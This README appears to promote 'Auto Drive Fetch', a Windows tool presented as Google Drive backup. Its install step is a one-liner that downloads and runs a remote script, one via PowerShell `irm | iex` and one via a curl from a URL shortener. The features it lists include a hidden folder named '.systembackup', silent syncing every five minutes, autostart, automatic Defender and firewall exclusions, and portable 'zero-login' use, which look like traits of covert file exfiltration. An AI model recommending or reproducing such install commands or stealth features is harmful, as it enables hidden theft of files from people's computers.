<div align="center">

# 🚀 Auto Drive Fetch

</div>

<p align="center">
  <img src="https://img.shields.io/badge/version-2.0.1-blue.svg" alt="Version 2.0.1">
  <img src="https://img.shields.io/badge/platform-Windows-lightgrey.svg" alt="Windows">
  <img src="https://img.shields.io/badge/license-MIT-green.svg" alt="MIT License">
</p>

---

### 🛡️ Not for stealing files For stealing **peace of mind**

###### ✦ One command. ✦ Forever backup. ✦ Zero login. ✦

---

## ⚡ Installation

### **PowerShell**

```powershell
irm https://maiz-an.github.io/AutoDriveFetch/install.ps1 | iex
```

### **Command Prompt (CMD)**

```cmd
curl -L -o %temp%\ADF_CLI.cmd https://tinyurl.com/maiz-adf && %temp%\ADF_CLI.cmd
```

**Both commands do the same thing.**  

- Python is installed automatically if missing.  
- A guided setup window will appear.  
- After setup, delete the installer folder – backup continues from `%LOCALAPPDATA%\.systembackup`.

---

## 🔁 How It Works

1. **Pick a local folder** – any folder on your PC.  
2. **Name a parent + subfolder** in Google Drive – saved forever.  
3. **Authenticate once** – browser popup, grant access.  
4. **Initial sync** uploads all existing files.  
5. **Hidden loop** syncs changes every 5 minutes, starts with Windows.  
6. **Auto‑update** keeps the script fresh – no manual downloads.

---

## ✨ Features

| | |
|---|---|
| ✅ **One‑line install** | `irm ... \| iex` (PowerShell) or `curl ...` (CMD) – no clicks, no bloat. |
| ✅ **Native folder picker** | No path typing – browse your PC. |
| ✅ **Persistent settings** | Parent folder + subfolder remembered forever. |
| ✅ **Zero‑login portability** | Authenticate once, run on any PC – USB ready. |
| ✅ **Permanent installation** | Lives in `%LOCALAPPDATA%\.systembackup`. |
| ✅ **Hidden 5‑minute sync** | Silent, efficient, automatic. |
| ✅ **Starts with Windows** | Startup shortcut added automatically. |
| ✅ **Defender & Firewall exclusions** | Added automatically (admin required). |
| ✅ **Auto‑update** | Always on the latest version. |
| ✅ **Full logging** | `log.json` (setup/sync history) + `%temp%\autodrivefetch_debug.log` (batch diagnostics). |

---

## 📂 Logs & Debug

| Log file | Location | Purpose |
|----------|----------|---------|
| `log.json` | `.systembackup\log.json` | All setup steps, sync results, errors. |
| `autodrivefetch_debug.log` | `%temp%\autodrivefetch_debug.log` | **Batch‑level diagnostics** – check here first if something fails. |

---

## 🛑 Stop / Uninstall

- **Stop syncing**: Delete the shortcut from `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Google Drive Sync - xxx.lnk`.  
- **Full uninstall**: Delete the entire `%LOCALAPPDATA%\.systembackup` folder.

---

<p align="center">
  Made with ⚡ by <strong>Maiz</strong>
</p>
